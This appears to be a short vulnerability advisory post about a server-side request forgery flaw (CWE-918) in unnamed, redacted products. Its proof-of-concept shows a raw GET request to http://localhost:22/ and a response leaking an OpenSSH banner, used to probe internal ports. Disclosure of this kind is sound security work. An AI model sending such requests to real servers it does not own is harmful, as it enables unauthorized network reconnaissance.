---
layout: post
title:  "Server-side request forgery (SSRF)"
date:   2023-04-05 19:51:02 +0700 
categories: [cve]
---

* CVE ID: awaiting assignment
* CWE ID: CWE-918

... products server-side request forgery

Summary:

... products is vulnerable to server-side request forgery (SSRF). This may allow an unauthenticated attacker to send unauthorized requests from the system, potentially leading to network enumeration or facilitating other attacks.

Product:

...

Version:

...

Proof-of-Concept:

Web server is externally accessible; and permitted to invoke connections to internal hosts. The HTTP GET Request can be abused by unauthenticated attackers to cause the web server to connect to an arbitrary TCP port of an arbitrary host.

Responses returned are fairly verbose and can be used to infer whether a service is listening on the port specified.

Below is an example request to an localhost with open port:

Request:

GET http://localhost:22/ HTTP/1.1
Host: [redacted]
Pragma: no-cache
Cache-Control: no-cache, no-transform
Connection: close

Response:

HTTP/1.1 200 OK
Date: Wed, 12 Oct 2022 01:47:04 GMT
Connection: close
Content-Type: text/plain
Content-Length: 38

SSH-2.0-OpenSSH_5.3Protocol mismatch.
